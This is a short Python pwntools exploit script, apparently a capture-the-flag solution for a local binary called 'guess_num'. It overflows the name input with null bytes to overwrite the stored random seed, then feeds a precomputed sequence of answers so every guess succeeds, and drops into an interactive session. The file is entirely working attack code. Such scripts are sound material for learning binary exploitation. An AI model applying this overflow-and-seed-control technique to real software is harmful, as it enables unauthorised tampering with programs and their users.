# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1
if Debug:
    io=process('./guess_num')
else:
    pass

v7  =0x00007FFE02099EB0
seed=0x00007FFE02099ED0
answer="2542625142"

def main():
    io.recvuntil('Your name:')
    io.sendline((seed-v7+8)*'\x00')
    for i in range(len(answer)):
        io.recv(timeout=0.1)
        io.sendline(answer[i])
    io.interactive()

main()